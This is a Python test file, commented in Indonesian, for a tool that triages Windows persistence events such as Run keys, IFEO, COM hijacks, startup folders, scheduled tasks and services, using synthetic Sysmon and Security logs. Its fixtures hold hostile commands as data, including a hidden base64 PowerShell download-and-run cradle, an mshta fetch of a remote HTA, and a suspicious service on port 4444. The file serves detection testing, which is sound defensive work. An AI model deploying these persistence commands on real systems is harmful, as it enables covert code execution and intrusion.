"""test_win_persist_triage — triase lokasi persistensi Windows
(#0551 #0554 #0555 #0556 #0559 #0561), nol jaringan.

Fixture = ekspor XML sintetis: Sysmon EID 1/11/12/13 (Run key,
Winlogon, IFEO, AppInit, COM InprocServer32, Startup folder) + Security
4697/4698/4702 (service install, task create/update). Pembagian ranah
diuji eksplisit: EID 20 (WMI) = sysmon_triage B16; 7045 = win_auth_triage
B15; schtasks /create cmdline = lolbin_scan B15.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import win_persist_triage as wpt  # noqa: E402
from xml.sax.saxutils import escape as _xesc  # noqa: E402

TASK_XML = (
    '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2">'
    "<Triggers><LogonTrigger/></Triggers>"
    '<Actions><Exec><Command>powershell.exe</Command>'
    "<Arguments>-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3"
    "AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0"
    "ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0"
    "AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1AC8AcAAuAHAAcwAx"
    "ACIAKQA=</Arguments></Exec></Actions></Task>")


def _task(content: str) -> str:
    """Isi TaskContent pada event asli berupa XML ter-escape."""
    return _xesc(content)


def _ev(eid: int, **data: str) -> str:
    t = data.pop("time", "2026-03-18T01:00:00.000Z")
    host = data.pop("host", "PC-01.corp.local")
    body = "".join(
        f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/'
            f'windows/events/log"><System><EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{t}"/>'
            f'<Computer>{host}</Computer></System>'
            f'<EventData>{body}</EventData></Event>')


def _file(tmp_path: Path, *events: str, name: str = "ev.xml") -> Path:
    p = tmp_path / name
    p.write_text("<Events>" + "".join(events) + "</Events>",
                 encoding="utf-8")
    return p


def _run(*args: str) -> tuple[int, dict | None, str]:
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "win_persist_triage.py"), *args],
        capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out, proc.stderr


def _findings(out, check):
    return [x for x in out["findings"] if x["check"] == check]


# ------------------------------------------------------- registry
def test_run_key_suspicious_content_high(tmp_path):
    ev = _ev(13, TargetObject=(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Upd"),
        Details="mshta.exe http://192.0.2.5/p.hta",
        Image="C:\\Windows\\System32\\cmd.exe")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 1, err
    f = _findings(out, "run-key-write")
    assert len(f) == 1 and f[0]["severity"] == "high"
    assert "T1547.001" in f[0]["message"]


def test_run_key_benign_write_medium(tmp_path):
    ev = _ev(13, TargetObject=(
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
        "OneDrive"), Details="\"C:\\Program Files\\Microsoft OneDrive\\"
        "OneDrive.exe\" /background",
        Image="C:\\Windows\\System32\\msiexec.exe")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)),
                        "--fail-on", "medium", "--json")
    assert rc == 1, err
    f = _findings(out, "run-key-write")
    assert len(f) == 1 and f[0]["severity"] == "medium"


def test_run_once_and_policies_paths(tmp_path):
    evs = (_ev(13, TargetObject=(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\x"),
        Details="C:\\Users\\Public\\a.exe"),
        _ev(13, TargetObject=(
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies"
            "\\Explorer\\Run\\y"), Details="cmd.exe /c calc"))
    rc, out, err = _run("--log", str(_file(tmp_path, *evs)), "--json")
    assert rc == 1
    assert len(_findings(out, "run-key-write")) == 2


def test_winlogon_ifeo_appinit(tmp_path):
    evs = (_ev(13, TargetObject=(
        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
        "\\Userinit"), Details="C:\\Windows\\userinit.exe,"
        "\\\\srv2\\share\\b.exe"),
        _ev(13, TargetObject=(
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            "Image File Execution Options\\notepad.exe\\Debugger"),
            Details="C:\\Temp\\dbg.exe"),
        _ev(13, TargetObject=(
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
            "Windows\\AppInit_DLLs"),
            Details="C:\\Users\\Public\\hook.dll"))
    rc, out, err = _run("--log", str(_file(tmp_path, *evs)), "--json")
    assert rc == 1, err
    assert len(_findings(out, "winlogon-modify")) == 1
    assert len(_findings(out, "ifeo-hijack")) == 1
    assert len(_findings(out, "appinit-dll")) == 1


def test_com_inproc_severity_by_content(tmp_path):
    evs = (_ev(13, TargetObject=(
        "HKCU\\Software\\Classes\\CLSID\\{11111111-2222-3333-4444-"
        "555555555555}\\InprocServer32"),
        Details="C:\\Users\\Public\\evil.dll"),
        _ev(13, TargetObject=(
            "HKCR\\CLSID\\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}\\"
            "InprocServer32"),
            Details="C:\\Program Files\\Vendor\\ok.dll"))
    rc, out, err = _run("--log", str(_file(tmp_path, *evs)),
                        "--fail-on", "medium", "--json")
    f = _findings(out, "com-hijack")
    assert len(f) == 2
    assert sorted(x["severity"] for x in f) == ["high", "medium"]


def test_allow_key_anti_fp(tmp_path):
    ev = _ev(13, TargetObject=(
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
        "OneDrive"), Details="OneDrive.exe /background",
        Image="msiexec.exe")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json",
                        "--allow-key", "OneDrive")
    assert rc == 0 and out["findings"] == []


# ------------------------------------------------------- startup folder
def test_startup_file_by_extension(tmp_path):
    evs = (_ev(11, TargetFilename=(
        "C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu"
        "\\Programs\\Startup\\update.vbs")),
        _ev(11, TargetFilename=(
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\"
            "Startup\\readme.txt")))
    rc, out, err = _run("--log", str(_file(tmp_path, *evs)),
                        "--fail-on", "medium", "--json")
    f = _findings(out, "startup-folder-file")
    assert len(f) == 2
    assert sorted(x["severity"] for x in f) == ["high", "medium"]


def test_startup_exec_high(tmp_path):
    ev = _ev(1, Image=("C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\"
                       "Windows\\Start Menu\\Programs\\Startup\\x.exe"),
             CommandLine="x.exe -enc AAAA")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 1
    assert len(_findings(out, "startup-folder-exec")) == 1


def test_allow_path_anti_fp(tmp_path):
    ev = _ev(11, TargetFilename=(
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\"
        "Startup\\deploy.bat"))
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json",
                        "--allow-path", "C:\\ProgramData\\Microsoft")
    assert rc == 0 and out["findings"] == []


# ------------------------------------------------------- task/service
def test_task_action_suspicious_and_trigger(tmp_path):
    ev = _ev(4698, TaskName="\\Updater", TaskContent=_task(TASK_XML),
             SubjectUserName="CORP\\admin")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 1, err
    assert len(_findings(out, "task-action-suspicious")) == 1
    assert len(_findings(out, "task-outside-microsoft")) == 1
    assert len(_findings(out, "task-trigger")) == 1


def test_task_outside_microsoft_only(tmp_path):
    ev = _ev(4698, TaskName="\\BackupCorp\\nightly",
             TaskContent=_task("<?xml?><Task><Actions><Exec>"
                         "<Command>robocopy.exe</Command>"
                         "<Arguments>D: E:</Arguments></Exec></Actions>"
                         "</Task>"), SubjectUserName="SYSTEM")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)),
                        "--fail-on", "medium", "--json")
    assert len(_findings(out, "task-outside-microsoft")) == 1
    assert _findings(out, "task-action-suspicious") == []
    assert _findings(out, "task-trigger") == []


def test_task_microsoft_not_flagged(tmp_path):
    ev = _ev(4698, TaskName="\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
             TaskContent=_task("<?xml?><Task><Actions><Exec>"
                         "<Command>defrag.exe</Command>"
                         "<Arguments>C:</Arguments></Exec></Actions>"
                         "</Task>"), SubjectUserName="SYSTEM")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 0 and out["findings"] == []


def test_task_short_interval_trigger(tmp_path):
    ev = _ev(4702, TaskName="\\Sync",
             TaskContent=_task("<?xml?><Task><Triggers><TimeTrigger>"
                         "<Interval>PT1M</Interval></TimeTrigger>"
                         "</Triggers><Actions><Exec>"
                         "<Command>sync.exe</Command></Exec></Actions>"
                         "</Task>"), SubjectUserName="CORP\\svc")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)),
                        "--fail-on", "medium", "--json")
    assert len(_findings(out, "task-trigger")) == 1


def test_service_install_suspicious(tmp_path):
    ev = _ev(4697, ServiceName="WinDefendBypass",
             ImagePath="%TEMP%\\svc.exe -p 4444",
             SubjectUserName="CORP\\user1", ServiceType="own process",
             StartType="auto start")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 1
    f = _findings(out, "service-install-suspicious")
    assert len(f) == 1 and "T1543.003" in f[0]["message"]


def test_service_delete_counted_only(tmp_path):
    evs = (_ev(4699, ServiceName="old", SubjectUserName="SYSTEM"),
           _ev(4697, ServiceName="ok", ImagePath=(
               "C:\\Windows\\System32\\svchost.exe -k netsvcs"),
               SubjectUserName="SYSTEM"))
    rc, out, err = _run("--log", str(_file(tmp_path, *evs)), "--json")
    assert rc == 0
    assert _findings(out, "service-install-suspicious") == []


# ------------------------------------------------------- ranah lain
def test_wmi_subscription_delegated_to_sysmon_triage(tmp_path):
    # EID 19/20/21 = ranah sysmon_triage (B16) — tidak diduplikasi
    ev = _ev(20, EventType="CommandLineEventConsumer",
             TargetInstance="cmd.exe /c calc")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 0 and out["findings"] == []
    assert out["stats"]["events_total"] == 0  # EID 20 di luar WATCHED


def test_7045_not_watched_here(tmp_path):
    # 7045 = ranah win_auth_triage (B15); 4697 (Security) di sini
    ev = _ev(7045, ServiceName="x", ImagePath="C:\\Temp\\x.exe")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    assert rc == 0 and out["findings"] == []


# ------------------------------------------------------- fail-closed
def test_bad_xml_fails_closed(tmp_path):
    p = tmp_path / "bad.xml"
    p.write_text("<Events><Event>", encoding="utf-8")
    rc, out, err = _run("--log", str(p))
    assert rc == 2 and out is None


def test_zero_events_fails_closed(tmp_path):
    p = tmp_path / "empty.xml"
    p.write_text("<Events></Events>", encoding="utf-8")
    rc, out, err = _run("--log", str(p))
    assert rc == 2


def test_absent_family_noted(tmp_path):
    ev = _ev(13, TargetObject=(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\a"),
        Details="C:\\Users\\Public\\a.exe", Image="cmd.exe")
    rc, out, err = _run("--log", str(_file(tmp_path, ev)), "--json")
    notes = " ".join(out["notes"])
    assert "EID 11" in notes and "EID 1" in notes \
        and "4697/4698" in notes


# ------------------------------------------------------- modes
def test_dir_mode_determinism_out(tmp_path):
    d = tmp_path / "exp"
    d.mkdir()
    (d / "a.xml").write_text("<Events>" + _ev(
        13, TargetObject=("HKCU\\Software\\Microsoft\\Windows\\"
                          "CurrentVersion\\Run\\p"),
        Details="mshta.exe http://x/p.hta", Image="cmd.exe")
        + "</Events>", encoding="utf-8")
    (d / "b.xml").write_text("<Events>" + _ev(
        4698, TaskName="\\Evil", TaskContent=_task(TASK_XML),
        SubjectUserName="CORP\\a") + "</Events>", encoding="utf-8")
    rc1, o1, _ = _run("--dir", str(d), "--json")
    rc2, o2, _ = _run("--dir", str(d), "--json")
    assert rc1 == rc2 == 1 and o1 == o2
    outp = tmp_path / "rep.json"
    rc3, o3, _ = _run("--dir", str(d), "--out", str(outp))
    assert rc3 == 1
    assert json.loads(outp.read_text(encoding="utf-8"))["schema"] == \
        wpt.SCHEMA


def test_task_parts_unit():
    cmds, logon, short, parsed = wpt._task_parts(TASK_XML)
    assert parsed and logon and not short
    assert any("powershell" in c for c in cmds)
    c2, l2, s2, p2 = wpt._task_parts(
        "<Task><Triggers><TimeTrigger><Interval>PT5M</Interval>"
        "</TimeTrigger></Triggers></Task>")
    assert p2 and s2 and not l2
    c3, l3, s3, p3 = wpt._task_parts("<Task><Actions/></Task>")
    assert p3 and not s3 and not l3
